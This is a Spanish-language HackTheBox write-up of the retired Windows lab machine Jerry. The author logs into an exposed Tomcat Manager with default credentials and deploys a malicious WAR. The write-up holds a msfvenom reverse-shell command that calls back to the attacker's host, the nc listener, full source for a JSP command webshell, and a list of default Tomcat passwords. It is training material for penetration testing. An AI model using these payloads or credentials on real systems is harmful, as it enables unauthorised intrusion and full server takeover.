---
title: 'Jerry - HackTheBox'
description: 'Writeup de la máquina Jerry de HackTheBox, una máquina Windows fácil con Apache Tomcat expuesto. Acceso mediante credenciales por defecto en el Manager y despliegue de un WAR malicioso para obtener SYSTEM.'
pubDate: 2026-03-28
platform: 'htb'
category: 'machines'
difficulty: 'easy'
os: 'windows'
language: es
tags:
  [
    'apache-tomcat',
    'default-credentials',
    'war',
    'msfvenom',
    'webshell',
    'windows',
  ]
retired: true
heroImage: '/images/writeups/hackthebox/jerry/card.png'
attackVectors: ['web']
techniques: ['T1190', 'T1059.003', 'T1505.003']
vulnerabilities: ['default-credentials', 'war-deploy']
certifications: ['OSCP', 'eJPT']
skillLevel: 'beginner'
estimatedTime: '30 minutos'
points: 20
rating: 4.0
---

# Jerry - HackTheBox Writeup

**Dificultad**: Easy
**OS**: Windows
**Plataforma**: HackTheBox
**IP**: 10.10.10.95
**Estado**: Retirada ✓

## Introducción

Jerry es una máquina Windows fácil con un Apache Tomcat accesible desde el exterior. Usando credenciales por defecto en el panel del Manager (`tomcat:s3cret`), subimos una aplicación WAR maliciosa que nos sirve una reverse shell con privilegios de `NT AUTHORITY\SYSTEM`.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts
```

**Puerto descubierto:**

- 8080/tcp - HTTP (Apache Tomcat)

### Escaneo de servicios

```bash
nmap -p8080 -sCV 10.10.10.95 -oN targeted
```

```
8080/tcp open  http  Apache Tomcat/Coyote JSP engine 1.1
```

**Versión detectada:** Apache Tomcat 7.0.88

## Enumeración Web

Accedemos a `http://10.10.10.95:8080` y encontramos la página de inicio de Apache Tomcat por defecto.

### Acceso al Manager

Navegamos a `/manager/html`. Aparece un diálogo de autenticación HTTP Basic. Probamos credenciales por defecto:

| Usuario    | Contraseña   |
| ---------- | ------------ |
| admin      | admin        |
| admin      | password     |
| tomcat     | tomcat       |
| **tomcat** | **s3cret** ✓ |

Acceso al **Tomcat Web Application Manager** conseguido.

### Enumeración de la versión

```bash
curl -s http://10.10.10.95:8080/manager/status -u "tomcat:s3cret" | grep "Apache Tomcat"
```

**Apache Tomcat 7.0.88** – versión desactualizada sin parches de seguridad recientes.

## Explotación

### Crear reverse shell en formato WAR

Usamos `msfvenom` para generar un archivo WAR con una reverse shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f war -o shell.war
```

### Desplegar el WAR en el Manager

Desde el panel del Manager (`/manager/html`), usamos la sección **"WAR file to deploy"**:

1. Seleccionamos el archivo `shell.war`
2. Click en **"Deploy"**

También podemos hacerlo por línea de comandos:

```bash
curl -v -u "tomcat:s3cret" http://10.10.10.95:8080/manager/text/deploy?path=/shell --upload-file shell.war
```

### Activar la reverse shell

Ponemos el listener en nuestra máquina:

```bash
nc -lvnp 4444
```

Activamos la aplicación desplegada:

```bash
curl http://10.10.10.95:8080/shell/
```

**Shell obtenida:**

```
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation.

C:\apache-tomcat-7.0.88>whoami
nt authority\system
```

Acceso directo como `NT AUTHORITY\SYSTEM`. No se requiere escalada de privilegios.

## Post-Explotación

### Flags

Las banderas en Jerry están almacenadas juntas en un único archivo:

```cmd
type C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

```
user.txt
<hash_usuario>

root.txt
<hash_root>
```

## Alternativa sin Metasploit

### JSP webshell manual

Crear un archivo `shell.jsp` con una webshell básica:

```java
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
    String[] cmdarr = {"cmd.exe", "/c", cmd};
    Process p = Runtime.getRuntime().exec(cmdarr);
    InputStream in = p.getInputStream();
    int c;
    while ((c = in.read()) != -1) {
        output += (char)c;
    }
}
%>
<pre><%=output%></pre>
```

Empaquetarlo en WAR:

```bash
mkdir webshell && cp shell.jsp webshell/
cd webshell && jar -cvf ../webshell.war .
```

Desplegar y acceder:

```bash
curl "http://10.10.10.95:8080/webshell/shell.jsp?cmd=whoami"
```

## Conclusión

Jerry enseña uno de los vectores de ataque más clásicos en entornos corporativos: **credenciales por defecto en paneles de administración**. Es habitual encontrar Tomcat Manager expuesto en entornos reales con contraseñas como `tomcat:s3cret` o `admin:admin`.

| Técnica                     | Herramienta       |
| --------------------------- | ----------------- |
| Escaneo de puertos          | nmap              |
| Brute-force de credenciales | manual / Hydra    |
| Generación de payload       | msfvenom          |
| Deploy WAR                  | curl / Manager UI |

## Recursos

- [Apache Tomcat Manager - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [Default Credentials List - SecLists](https://github.com/danielmiessler/SecLists)
